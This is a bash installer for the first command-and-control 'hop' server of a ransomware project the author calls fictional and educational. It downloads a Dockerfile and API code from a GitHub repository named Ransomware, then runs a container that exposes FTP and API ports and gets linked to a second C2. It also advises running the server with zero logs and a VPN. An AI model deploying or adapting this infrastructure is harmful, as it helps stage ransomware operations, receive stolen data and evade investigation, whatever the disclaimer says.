#!/bin/bash
# !! IMPORTANT !!
# This script is for educational purposes only. It is not intended to be used for malicious purposes.
# Author: M3str3 <nam3str3@protonmail.com>
# ==============================================================================
# This is the script for install the C2 #1 of my fictional ransomware 
# 
# Use example:
#   ./install.sh <API_KEY>
#
# NOTE: The same API_KEY it has to be configured in the C2#2.

if [ $# -eq 0 ]; then
    echo "Use: $0 <API_KEY>"
    exit 1
fi

# TODO: Like u have entire control over this server, you have to configure in the most
# secure way possible, like using a firewall, VPN, 0 logs, etc.
# Anyways its only the hop server

# Install Docker
sudo apt-get update && sudo apt-get install -y docker.io

# Get images
curl -O https://raw.githubusercontent.com/M3str3/Ransomware/main/Server/ClearServoce/Dockerfile
curl -O https://raw.githubusercontent.com/M3str3/Ransomware/main/Server/ClearServoce/api.py

# The service running over docker
docker build -t clearservice --build-arg API_KEY=$1 -t clearservice .
docker run -d -p 2121:2121 -p 5000:5000 clearservice

echo "[$] Done! The FTP is running on 2121 and API on 5000. Add this server to your servers.txt on C2#2"
